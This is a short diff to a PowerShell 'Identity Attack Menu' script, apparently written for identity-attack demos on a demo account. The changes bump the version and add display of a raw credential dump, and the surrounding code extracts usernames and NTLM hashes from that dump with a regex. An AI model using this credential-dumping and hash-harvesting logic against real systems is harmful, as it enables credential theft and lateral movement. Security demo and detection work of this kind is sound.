@@ -2,7 +2,7 @@
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
-#  Version: 3.4 (2026-03-26)
+#  Version: 3.5 (2026-03-26)
 # ============================================================
 
 # --- Environment Variables (set these in cmd BEFORE running) ---
@@ -97,7 +97,7 @@ function Get-SvcRunbookHash {
     return $null
 }
 
-$scriptVersion = "3.4"
+$scriptVersion = "3.5"
 
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
@@ -729,6 +729,9 @@ public class CryptoMD4 {
                 'Write-Host ""'
                 ''
                 '$content = Get-Content $localDump -Raw'
+                'Write-Host "  --- Raw dump (first 60 lines) ---" -ForegroundColor Gray'
+                'Get-Content $localDump -TotalCount 60 | ForEach-Object { Write-Host "  $_" -ForegroundColor DarkGray }'
+                'Write-Host ""'
                 'Write-Host "  --- Accounts with NTLM hashes ---" -ForegroundColor Yellow'
                 '$pattern = "(?ms)Username\s*:\s*(\S+)\s*\*\s*Domain\s*:\s*\S+\s*\*\s*NTLM\s*:\s*([0-9a-fA-F]{32})"'
                 '$found = [regex]::Matches($content, $pattern)'
